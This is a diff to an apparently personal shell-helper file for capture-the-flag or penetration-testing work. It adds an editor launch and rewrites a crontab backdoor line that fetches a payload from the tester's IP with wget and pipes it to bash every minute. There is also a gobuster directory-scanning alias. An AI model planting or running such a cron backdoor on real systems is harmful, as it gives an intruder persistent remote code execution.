@@ -86,6 +86,7 @@ newctf() {
   mkdir "$target_name" && cd "$target_name"
   echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $tip\n\n" > notes.md
   echo "$tip" > target_ip
+  code .
 }
 
 sett() {
@@ -117,8 +118,8 @@ revpayload() {
   python -m http.server
 }
 
-gencronbd() {
-  setclip "* * * * * /usr/bin/curl http://$(getip):8000/payload | /bin/bash"
+bdcron() {
+  setclip "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash"
 }
 
 alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
